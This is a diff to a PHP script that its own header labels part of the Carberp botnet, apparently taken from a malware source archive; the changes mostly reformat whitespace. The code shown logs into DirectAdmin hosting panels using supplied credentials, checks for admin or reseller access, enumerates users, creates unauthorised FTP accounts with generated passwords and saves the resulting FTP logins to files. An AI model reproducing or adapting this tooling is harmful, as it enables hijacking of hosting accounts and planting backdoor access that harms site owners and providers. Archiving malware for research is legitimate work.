@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 set_time_limit(0);
@@ -66,7 +77,9 @@ $http->open($site[0] . '/CMD_LOGIN');
 
 if($http->status == 200 && !empty($http->webpage)){
 	if(stripos($http->webpage, 'DirectAdmin Login Page') === false){
-		if(stripos($http->webpage, 'IMG_SKIN_CTRL_ACCESS') != false){			if(stripos($http->webpage, 'Admin Level') != false){				$http->clear($cookie);
+		if(stripos($http->webpage, 'IMG_SKIN_CTRL_ACCESS') != false){
+			if(stripos($http->webpage, 'Admin Level') != false){
+				$http->clear($cookie);
 				$http->config['followlocation'] = false;
 				$http->config['referer'] = $site[0];
 				$http->open($site[0] . '/CMD_ALL_USER_SHOW');
@@ -222,9 +235,11 @@ if($http->status == 200 && !empty($http->webpage)){
 					file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_domains_reseller_1' . "\r\n", FILE_APPEND);
 				}
 			}
-		}else{			preg_match_all('~<div class="right-pad">(.*)<b>(.*)</b>(.*)</div>~isU', $http->webpage, $match, PREG_SET_ORDER);
+		}else{
+			preg_match_all('~<div class="right-pad">(.*)<b>(.*)</b>(.*)</div>~isU', $http->webpage, $match, PREG_SET_ORDER);
 
-			if(!empty($match[0][2])){				$user = 'bda' . mt_rand(10, 999);
+			if(!empty($match[0][2])){
+				$user = 'bda' . mt_rand(10, 999);
 	    		$pwd = createPassword(10);
 
 	    		$http->clear($cookie);
@@ -239,13 +254,15 @@ if($http->status == 200 && !empty($http->webpage)){
 					file_put_contents($dir['script'] . '/ftps.txt', 'ftp://'.$user.'@'.$match[0][2].':'.$pwd.'@'.$match[0][2].':21/' . "\r\n", FILE_APPEND);
 
 					file_put_contents($dir['script'] . '/ftps_ok.txt', base64_decode($_SERVER['argv'][1]) . ' - ftp://'.$user.'@'.$match[0][2].':'.$pwd.'@'.$match[0][2].':21/' . "\r\n", FILE_APPEND);
-				}else{					file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' add_ftps_1' . "\r\n", FILE_APPEND);
+				}else{
+					file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' add_ftps_1' . "\r\n", FILE_APPEND);
 				}
 			}else{
 		    	file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_main_domain' . "\r\n", FILE_APPEND);
 		    }
 		}
-    }else{    	file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', base64_decode($_SERVER['argv'][1]) . "\r\n", FILE_APPEND);
+    }else{
+    	file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', base64_decode($_SERVER['argv'][1]) . "\r\n", FILE_APPEND);
     }
 }else{
 	file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', base64_decode($_SERVER['argv'][1]) . "\r\n", FILE_APPEND);
